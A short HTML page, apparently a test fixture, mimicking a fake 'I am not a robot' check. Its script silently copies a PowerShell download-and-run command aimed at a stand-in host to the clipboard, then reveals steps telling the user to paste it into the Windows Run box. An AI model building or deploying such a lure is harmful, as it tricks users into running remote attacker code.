<!doctype html><meta charset="utf-8"><title>Trap: copy before steps</title>
<h1>One more step</h1>
<button id="robot">I am not a robot</button>
<div id="steps" style="display:none">Verification steps: 1. Press Windows Key + R 2. Press CTRL + V 3. Press Enter</div>
<script>
document.getElementById('robot').addEventListener('click', async () => {
  // Copies FIRST, while the steps are still hidden, then reveals them.
  try { await navigator.clipboard.writeText('powershell -c "irm https://example.invalid/x | iex"'); document.title = 'copied'; } catch (e) { document.title = 'error ' + e; }
  document.getElementById('steps').style.display = 'block';
});
</script>
